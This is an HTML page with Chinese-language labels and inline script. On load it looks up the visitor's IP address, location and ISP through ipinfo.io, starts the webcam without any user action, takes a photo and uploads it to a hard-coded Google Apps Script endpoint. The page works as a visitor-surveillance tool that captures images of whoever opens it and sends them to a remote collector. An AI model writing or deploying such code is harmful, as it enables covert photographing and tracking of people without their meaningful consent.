<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>照片上傳與記錄</title>
</head>
<body>
  <h1>自動拍攝照片與記錄 IP 資訊</h1>
  <p id="ipInfo">載入中...</p>
  <p id="status">尚未開始操作</p>

  <script>
    // 獲取 IP 和地理位置信息
    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
      })
      .catch(error => {
        console.error('無法獲取 IP 資訊:', error);
        document.getElementById('ipInfo').innerText = '無法獲取 IP 資訊';
      });

    document.addEventListener('DOMContentLoaded', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);

        // 拍攝照片
        const photoBlob = await imageCapture.takePhoto();
        const reader = new FileReader();
        reader.onloadend = () => {
          const base64Photo = reader.result;

          // 發送照片至 Google Apps Script
          fetch('https://script.google.com/macros/s/AKfycbx6RTKvVEAolmpqXAkqwDI14PKitXTeYnqTet_bmrfXrG7mRf2EW4bj3mPVtTCBJl4n4g/exec', { // 替換為 Apps Script 部署 URL
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ photos: [base64Photo] }),
          })
            .then(response => response.json())
            .then(data => {
              if (data.success) {
                document.getElementById('status').innerText = `上傳成功！照片 URL: ${data.photoUrls.join(', ')}`;
              } else {
                document.getElementById('status').innerText = `上傳失敗: ${data.error}`;
              }
            })
            .catch(error => {
              console.error('上傳失敗:', error);
              document.getElementById('status').innerText = '上傳失敗，請檢查控制台。';
            });
        };
        reader.readAsDataURL(photoBlob);
      } catch (error) {
        console.error('拍攝照片失敗:', error);
        document.getElementById('status').innerText = '拍攝失敗，請檢查攝像頭權限。';
      }
    });
  </script>
</body>
</html>
